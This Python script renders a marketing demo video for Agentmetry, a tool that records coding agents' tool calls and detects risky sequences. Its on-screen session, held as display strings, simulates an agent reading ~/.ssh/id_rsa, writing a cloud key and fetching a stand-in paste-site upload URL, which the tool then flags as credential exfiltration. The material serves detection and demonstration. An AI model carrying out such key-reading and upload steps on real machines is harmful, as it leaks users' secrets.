"""Render the 90-second Agentmetry demo video, frame by frame.

Every terminal line is real output: `agentmetry demo` and `agentmetry
benchmark` from 0.9.4 on 2026-10-08. Brand per agentmetry.ai: black, warm
off-white, IBM Plex, orange only for the critical finding and the call to
action, sentence case, no em-dashes.

    python scripts/make_demo_video.py            # docs/assets/agentmetry-demo-90s.mp4
    python scripts/make_demo_video.py --stills   # a few PNGs to check the look

Needs Pillow, ffmpeg on PATH, and the IBM Plex fonts the marketing site
bundles (../ai-audit-watch, or AGENTMETRY_PLEX_DIR pointing at @fontsource).
"""

from __future__ import annotations

import math
import os
import subprocess
import sys
from pathlib import Path

from PIL import Image, ImageDraw, ImageFont

W, H, FPS, DURATION = 1920, 1080, 30, 90.0
_REPO = Path(__file__).resolve().parents[1]
OUT = _REPO / "docs" / "assets" / "agentmetry-demo-90s.mp4"
FONTS = Path(
    os.environ.get("AGENTMETRY_PLEX_DIR")
    or _REPO.parent / "ai-audit-watch" / "node_modules" / "@fontsource"
)

FG = (244, 241, 234)
MUTED = (154, 149, 140)
DIM = (107, 103, 96)
ORANGE = (249, 115, 22)
GREEN = (134, 239, 172)
AMBER = (217, 164, 65)
RED = (235, 74, 61)
BORDER = (38, 38, 38)


def font(family: str, weight: int, size: int) -> ImageFont.FreeTypeFont:
    return ImageFont.truetype(
        str(FONTS / f"ibm-plex-{family}" / "files" / f"ibm-plex-{family}-latin-{weight}-normal.woff"), size
    )


H1 = font("sans", 600, 66)
H2 = font("sans", 600, 52)
BODY = font("sans", 400, 40)
CAP = font("sans", 400, 32)
SMALL = font("sans", 400, 28)
WORD = font("sans", 600, 64)
MONO = font("mono", 400, 27)
MONO_L = font("mono", 400, 40)


def col(c: tuple[int, int, int], a: float) -> tuple[int, int, int]:
    # Everything sits on black, so alpha is a multiply.
    a = max(0.0, min(1.0, a))
    return (int(c[0] * a), int(c[1] * a), int(c[2] * a))


def ease(x: float) -> float:
    x = max(0.0, min(1.0, x))
    return 1 - (1 - x) ** 3


def appear(t: float, at: float, dur: float = 0.5) -> float:
    return ease((t - at) / dur)


def typed(text: str, t: float, at: float, cps: float = 30.0) -> str:
    if t < at:
        return ""
    return text[: int((t - at) * cps)]


def scene_alpha(t: float, start: float, end: float, fade: float = 0.45) -> float:
    if t < start or t > end:
        return 0.0
    return min(1.0, (t - start) / fade, (end - t) / fade)


# --- backdrop: the site's grid and warm glow, computed once ----------------------------

def backdrop() -> Image.Image:
    img = Image.new("RGB", (W, H), (0, 0, 0))
    px = img.load()
    gx, gy = W * 0.72, H * 0.30
    for y in range(H):
        for x in range(W):
            d = math.hypot((x - W * 1.02) / (W * 0.55), (y + H * 0.15) / (H * 0.75))
            glow = max(0.0, 1 - d) ** 2 * 0.10
            m = max(0.0, 1 - math.hypot((x - gx) / (W * 0.5), (y - gy) / (H * 0.55)))
            line = 0.045 * m if (x % 64 == 0 or y % 64 == 0) else 0.0
            r = ORANGE[0] * glow + FG[0] * line
            g = ORANGE[1] * glow + FG[1] * line
            b = ORANGE[2] * glow + FG[2] * line
            px[x, y] = (int(r), int(g), int(b))
    return img


# --- drawing helpers ---------------------------------------------------------------------

def center_text(d: ImageDraw.ImageDraw, y: float, text: str, f, c, a: float) -> None:
    w = d.textlength(text, font=f)
    d.text(((W - w) / 2, y), text, font=f, fill=col(c, a))


def segments(d: ImageDraw.ImageDraw, x: float, y: float, segs, f, a: float) -> None:
    for text, c in segs:
        d.text((x, y), text, font=f, fill=col(c, a))
        x += d.textlength(text, font=f)


def panel(d: ImageDraw.ImageDraw, box, a: float) -> None:
    d.rectangle(box, fill=col((3, 3, 3), a), outline=col(BORDER, a), width=2)


def mark(d: ImageDraw.ImageDraw, cx: float, cy: float, s: float, a: float) -> None:
    """The Agentmetry chevron A and its record dot, from docs/logo/agentmetry-icon.svg."""
    pts = [(88, 24), (152, 150), (120, 150), (88, 84), (56, 150), (24, 150)]
    sc = s / 176
    poly = [(cx + (px - 88) * sc, cy + (py - 88) * sc) for px, py in pts]
    d.polygon(poly, fill=col(FG, a))
    r = 15 * sc
    dx, dy = cx, cy + (124 - 88) * sc
    d.ellipse((dx - r, dy - r, dx + r, dy + r), fill=col(ORANGE, a))


def logo(d: ImageDraw.ImageDraw, cy: float, a: float, s: float = 120) -> None:
    gap = 28
    word_w = d.textlength("Agentmetry", font=WORD)
    total = s * 0.75 + gap + word_w
    x0 = (W - total) / 2
    mark(d, x0 + s * 0.375, cy, s, a)
    d.text((x0 + s * 0.75 + gap, cy - 42), "Agentmetry", font=WORD, fill=col(FG, a))


def slab(d: ImageDraw.ImageDraw, x: float, y: float, w: float, h: float, edge, face, a: float) -> None:
    """A record as a thin 3D slab: front face, top face and side, in line."""
    dx, dy = 26, -20
    top = [(x, y), (x + w, y), (x + w + dx, y + dy), (x + dx, y + dy)]
    side = [(x + w, y), (x + w + dx, y + dy), (x + w + dx, y + h + dy), (x + w, y + h)]
    d.polygon(top, fill=col(face, a * 1.0), outline=col(edge, a))
    d.polygon(side, fill=col(face, a * 0.7), outline=col(edge, a))
    d.rectangle((x, y, x + w, y + h), fill=col(face, a * 0.85), outline=col(edge, a), width=2)


# --- scenes ------------------------------------------------------------------------------

def s1(d, t):
    a = scene_alpha(t, 0.0, 8.0)
    if a <= 0:
        return
    center_text(d, 420, "Your coding agent reads a private key,", H1, FG, a * appear(t, 0.5))
    center_text(d, 505, "then calls the network.", H1, FG, a * appear(t, 1.1))
    center_text(d, 640, "Your EDR sees powershell.exe.", H1, MUTED, a * appear(t, 3.2))


def s2(d, t):
    a = scene_alpha(t, 8.0, 16.0)
    if a <= 0:
        return
    logo(d, 380, a * appear(t, 8.3, 0.7))
    center_text(d, 520, "Agentmetry records every tool call your coding agents make,", BODY, FG, a * appear(t, 9.6))
    center_text(d, 575, "on the developer's machine.", BODY, FG, a * appear(t, 9.9))
    center_text(d, 680, "Claude Code, Cursor, Codex and more. Apache-2.0.", CAP, MUTED, a * appear(t, 11.4))


def s3(d, t):
    a = scene_alpha(t, 16.0, 22.0)
    if a <= 0:
        return
    box = (460, 360, 1460, 600)
    panel(d, box, a)
    y = 405
    l1 = typed("pip install agentmetry", t, 16.7, 18)
    segments(d, 510, y, [("$ ", DIM), (l1, FG)], MONO_L, a)
    if t > 18.3:
        l2 = typed("agentmetry demo", t, 18.6, 18)
        segments(d, 510, y + 80, [("$ ", DIM), (l2, FG)], MONO_L, a)
    center_text(d, 670, "One command. No server, no config, nothing kept.", CAP, MUTED, a * appear(t, 19.9))


SESSION = [
    (22.6, [("  agent ", FG), ("reads a private key", MUTED)]),
    (23.2, "$ cat ~/.ssh/id_rsa"),
    (24.6, [("  agent ", FG), ("writes a cloud key into a config file", MUTED)]),
    (25.1, "$ echo aws_access_key_id=AKIAIOSFODNN7EXAMPLE >> ~/.aws/credentials"),
    (27.4, [("  DLP   ", AMBER), ("matched ", MUTED), ("aws_access_key", FG), (" (critical), value NOT stored", MUTED)]),
    (28.5, [("  agent ", FG), ("fetches a URL", MUTED)]),
    (29.0, "$ fetch https://paste.example.com/upload"),
    (30.9, None),
    (31.0, [("What Agentmetry recorded", FG)]),
    (31.5, [("  cursor.Read    ", FG), ("T1552.004   ", FG), ("Credential Access", MUTED)]),
    (31.9, [("  cursor.Shell   ", FG), ("T1552.001   ", FG), ("Credential Access  ", MUTED), ("[dlp:aws_access_key]", AMBER)]),
    (32.3, [("  WebFetch       ", FG), ("T1071.001   ", FG), ("Command and Control", MUTED)]),
    (33.3, None),
    (33.5, [("  [CRITICAL] credential-exfil", ORANGE)]),
    (34.0, [("  cursor.Read accessed credentials, then WebFetch egressed to the network in the same session.", FG)]),
    (34.4, [("  ATT&CK: T1552.004 -> T1071.001 · correlates 2 events", MUTED)]),
]


def s4(d, t):
    a = scene_alpha(t, 22.0, 42.0)
    if a <= 0:
        return
    box = (110, 90, 1810, 880)
    panel(d, box, a)
    y = 130
    for at, line in SESSION:
        if line is None:
            y += 22
            continue
        if t >= at:
            if isinstance(line, str):
                text = typed(line[2:], t, at, 45)
                segments(d, 150, y, [("  $ ", DIM), (text, FG)], MONO, a)
            else:
                la = a * appear(t, at, 0.3)
                if line[0][1] == ORANGE:
                    # One pulse, then it holds.
                    p = max(0.0, 1 - (t - at) / 1.4)
                    gy = y - 8
                    d.rectangle((140, gy, 1790, gy + 46), fill=col(ORANGE, la * (0.10 + 0.22 * p)))
                segments(d, 150, y, line, MONO, la)
        y += 44
    center_text(d, 935, "No single call is an alert. The sequence is.", CAP, FG, a * appear(t, 35.6))


def s5(d, t):
    a = scene_alpha(t, 42.0, 60.0)
    if a <= 0:
        return
    center_text(d, 92, "Now try to rewrite it", H2, FG, a * appear(t, 42.3))
    # The chain: four records, the last is the detection.
    edited = t >= 46.6
    rewritten = t >= 50.4
    bw, bh, gap = 230, 54, 90
    total = 4 * bw + 3 * gap
    x0 = (W - total) / 2
    y0 = 270
    ca = a * appear(t, 42.8, 0.7)
    for i in range(4):
        x = x0 + i * (bw + gap)
        last = i == 3
        if last and rewritten:
            edge, face = AMBER, (40, 30, 10)
        elif last and edited:
            edge, face = RED, (45, 12, 10)
        elif last:
            edge, face = ORANGE, (50, 22, 6)
        else:
            edge, face = (120, 117, 110), (14, 14, 14)
        slab(d, x, y0, bw, bh, edge, face, ca)
        if i < 3:
            lx0, lx1, ly = x + bw + 4, x + bw + gap - 4, y0 + bh / 2
            broken = i == 2 and edited and not rewritten
            lc = RED if broken else AMBER if (i == 2 and rewritten) else (90, 88, 84)
            if broken:
                mid = (lx0 + lx1) / 2
                d.line((lx0, ly, mid - 12, ly), fill=col(lc, ca), width=3)
                d.line((mid + 12, ly, lx1, ly), fill=col(lc, ca), width=3)
            else:
                d.line((lx0, ly, lx1, ly), fill=col(lc, ca), width=3)
    labels = ["seq 1", "seq 2", "seq 3", "seq 4 · detection"]
    for i, lab in enumerate(labels):
        x = x0 + i * (bw + gap)
        d.text((x, y0 + bh + 18), lab, font=SMALL, fill=col(MUTED, ca))

    box = (190, 440, 1730, 885)
    panel(d, box, a)
    rows = [
        (44.0, [("  agentmetry verify --trail     ", FG), ("OK", GREEN), (", 4 chained records", MUTED)]),
        (44.5, [("  head: seq 4, sha256 34a884a04c60fbb9...", MUTED)]),
        (46.2, [("  someone ", FG), ("downgrades the CRITICAL detection to low, in place", MUTED)]),
        (47.6, [("  agentmetry verify --trail     ", FG), ("FAIL", RED), (", record_sha256 mismatch at line 4 (tampered?)", MUTED)]),
        (49.6, [("  someone ", FG), ("re-hashes every record after the edit, as anyone with the whole machine could", MUTED)]),
        (51.4, [("  agentmetry verify --trail     ", FG), ("OK", GREEN), (", and that is the point", MUTED)]),
        (52.2, [("  head: seq 4, sha256 bb8298d03cd022de...  ", MUTED), ("not the head recorded above", AMBER)]),
    ]
    y = 480
    for at, segs in rows:
        if t >= at:
            segments(d, 220, y, segs, MONO, a * appear(t, at, 0.3))
        y += 48 if at not in (44.5, 47.6) else 64
    ca2 = a * appear(t, 54.2)
    w1 = d.textlength("A chain catches an edit. Only a head kept off the machine catches a rewrite: ", font=CAP)
    w2 = d.textlength("agentmetry anchor", font=MONO)
    x = (W - w1 - w2) / 2
    d.text((x, 935), "A chain catches an edit. Only a head kept off the machine catches a rewrite: ", font=CAP, fill=col(FG, ca2))
    d.text((x + w1, 940), "agentmetry anchor", font=MONO, fill=col(FG, ca2))


SINKS = ["Splunk", "Elastic", "Microsoft Sentinel", "Google SecOps"]
SINK_Y = [330, 450, 570, 690]
SRC_X, FORK_X, QUEUE_X, SINK_X = 360, 860, 1290, 1420
SPAWN0, SPAWN_EVERY, N_REC = 60.8, 0.42, 25
OFF_START, OFF_END = 63.8, 67.6
LEG1, LEG2, DRAIN = 1.0, 1.0, 0.09


def flow_plan():
    """Deterministic schedule: when each copy reaches each sink, with Splunk's queue."""
    plan = []  # (k, sink, t_fork, t_arrive_or_queue, release or None)
    q_free = OFF_END
    queued = 0
    for k in range(N_REC):
        s = SPAWN0 + k * SPAWN_EVERY
        tf = s + LEG1
        for j in range(4):
            ta = tf + LEG2
            if j == 0 and OFF_START <= ta < max(OFF_END, q_free):
                release = max(q_free, ta)
                q_free = release + DRAIN
                plan.append((k, j, s, ta, release, queued))
                queued += 1
            else:
                plan.append((k, j, s, ta, None, None))
    return plan


PLAN = flow_plan()


def s6(d, t):
    a = scene_alpha(t, 60.0, 72.0)
    if a <= 0:
        return
    center_text(d, 92, "Into the SIEM you already run", H2, FG, a * appear(t, 60.3))
    # Source and lanes.
    d.rectangle((SRC_X - 150, 380, SRC_X - 20, 640), outline=col((120, 117, 110), a), width=2)
    d.text((SRC_X - 150, 655), "local trail", font=SMALL, fill=col(MUTED, a))
    # Its lines: the records, kept here whatever happens downstream.
    for i in range(9):
        ly = 405 + i * 26
        d.line((SRC_X - 130, ly, SRC_X - 40 - (i * 17) % 40, ly), fill=col((90, 88, 84), a), width=3)
    d.line((SRC_X, 510, FORK_X, 510), fill=col((60, 60, 58), a), width=2)
    offline = OFF_START <= t < OFF_END
    for j, (name, sy) in enumerate(zip(SINKS, SINK_Y)):
        off = offline and j == 0
        d.line((FORK_X, 510, SINK_X, sy + 22), fill=col((48, 48, 46), a * (0.4 if off else 1)), width=2)
        d.rectangle((SINK_X, sy, SINK_X + 44, sy + 44), outline=col((120, 117, 110), a * (0.35 if off else 1)), width=2)
        d.text((SINK_X + 64, sy + 4), name, font=SMALL, fill=col(DIM if off else FG, a))
        if off:
            d.text((SINK_X + 64 + d.textlength(name, font=SMALL) + 16, sy + 4), "offline", font=SMALL, fill=col(AMBER, a))
    # Records to the fork.
    for k in range(N_REC):
        s = SPAWN0 + k * SPAWN_EVERY
        if s <= t < s + LEG1:
            p = (t - s) / LEG1
            x = SRC_X + (FORK_X - SRC_X) * p
            d.rectangle((x - 9, 501, x + 9, 519), fill=col((20, 20, 20), a), outline=col(FG, a), width=2)
    # Copies to each sink, or to Splunk's cursor while it is down.
    waiting = 0
    for k, j, s, ta, release, qi in PLAN:
        tf = s + LEG1
        if t < tf:
            continue
        sy = SINK_Y[j] + 22
        if release is None or t < ta:
            if t >= ta:
                continue
            p = (t - tf) / LEG2
            end_x = QUEUE_X if release is not None else SINK_X
            stop_p = (QUEUE_X - FORK_X) / (SINK_X - FORK_X) if release is not None else 1.0
            pp = min(p, stop_p) / stop_p if release is not None else p
            x = FORK_X + (end_x - FORK_X) * pp
            y = 510 + (sy - 510) * pp
            d.rectangle((x - 6, y - 6, x + 6, y + 6), fill=col(FG, a * 0.9))
        else:
            # Queued at the cursor until released, then into the sink.
            if t < release:
                waiting += 1
                col_i, row_i = divmod(qi, 7)
                x = QUEUE_X - col_i * 18
                y = sy + 14 - row_i * 16 - 30
                d.rectangle((x - 6, y - 6, x + 6, y + 6), fill=col(AMBER, a))
            elif t < release + 0.25:
                p = (t - release) / 0.25
                x = QUEUE_X + (SINK_X - QUEUE_X) * p
                d.rectangle((x - 6, sy - 6, x + 6, sy + 6), fill=col(AMBER, a))
    status = ""
    if offline:
        status = f"Splunk is offline. {waiting} waiting at its cursor, none dropped."
    elif t >= OFF_END and waiting:
        status = f"Splunk is back. Its cursor is draining: {waiting} left."
    if status:
        center_text(d, 800, status, SMALL, MUTED, a)
    center_text(d, 905, "From a cursor per sink. An outage delays events, it does not lose them.", CAP, FG, a * appear(t, 61.6))


BENCH = [
    "Agentmetry detection benchmark",
    "",
    "  cases            54 (26 attack, 28 benign)",
    "  rules covered    13",
    "  expected firings 26",
    "  detected         26",
    "  missed           0",
    "  false positives  0",
    "",
    "  All cases behaved as recorded.",
]


def s7(d, t):
    a = scene_alpha(t, 72.0, 82.0)
    if a <= 0:
        return
    center_text(d, 92, "Every claim has a command behind it", H2, FG, a * appear(t, 72.3))
    box = (460, 230, 1460, 820)
    panel(d, box, a)
    segments(d, 500, 270, [("$ ", DIM), (typed("agentmetry benchmark", t, 72.9, 22), FG)], MONO, a)
    y = 330
    for i, line in enumerate(BENCH):
        at = 74.1 + i * 0.22
        if t >= at and line:
            c = GREEN if line.strip() in ("missed           0", "false positives  0") else FG if i == 9 else MUTED
            d.text((500, y), line, font=MONO, fill=col(c, a * appear(t, at, 0.25)))
        y += 44
    center_text(d, 890, "Run it yourself before you believe it.", CAP, FG, a * appear(t, 77.6))


def s8(d, t):
    a = scene_alpha(t, 82.0, 90.6)
    if a <= 0:
        return
    logo(d, 360, a * appear(t, 82.3, 0.7))
    la = a * appear(t, 83.6)
    w = d.textlength("pip install agentmetry", font=MONO_L)
    d.rectangle(((W - w) / 2 - 36, 500, (W + w) / 2 + 36, 584), outline=col(BORDER, la), width=2, fill=col((3, 3, 3), la))
    center_text(d, 518, "pip install agentmetry", MONO_L, FG, la)
    center_text(d, 640, "agentmetry.ai/pilot", BODY, ORANGE, a * appear(t, 84.8))
    center_text(d, 730, "Local-first. Your trail stays on your machine.", CAP, MUTED, a * appear(t, 86.0))


SCENES = [s1, s2, s3, s4, s5, s6, s7, s8]


def frame(base: Image.Image, t: float) -> Image.Image:
    img = base.copy()
    d = ImageDraw.Draw(img)
    for s in SCENES:
        s(d, t)
    return img


def main() -> int:
    base = backdrop()
    if "--stills" in sys.argv:
        out = OUT.parent / "demo-stills"
        out.mkdir(parents=True, exist_ok=True)
        for t in (3.5, 12.0, 20.5, 36.0, 48.6, 53.5, 65.5, 69.0, 79.0, 88.0):
            frame(base, t).save(out / f"t{t:05.1f}.png")
        print("stills in", out)
        return 0
    OUT.parent.mkdir(parents=True, exist_ok=True)
    cmd = [
        "ffmpeg", "-y", "-loglevel", "error",
        "-f", "rawvideo", "-pix_fmt", "rgb24", "-s", f"{W}x{H}", "-r", str(FPS), "-i", "-",
        "-c:v", "libx264", "-preset", "slow", "-crf", "18", "-pix_fmt", "yuv420p",
        "-movflags", "+faststart", str(OUT),
    ]
    proc = subprocess.Popen(cmd, stdin=subprocess.PIPE)
    n = int(DURATION * FPS)
    for i in range(n):
        proc.stdin.write(frame(base, i / FPS).tobytes())
        if i % 300 == 0:
            print(f"frame {i}/{n}", flush=True)
    proc.stdin.close()
    proc.wait()
    frame(base, 88.0).save(OUT.with_name("agentmetry-demo-poster.png"))
    print("wrote", OUT)
    return proc.returncode


if __name__ == "__main__":
    raise SystemExit(main())
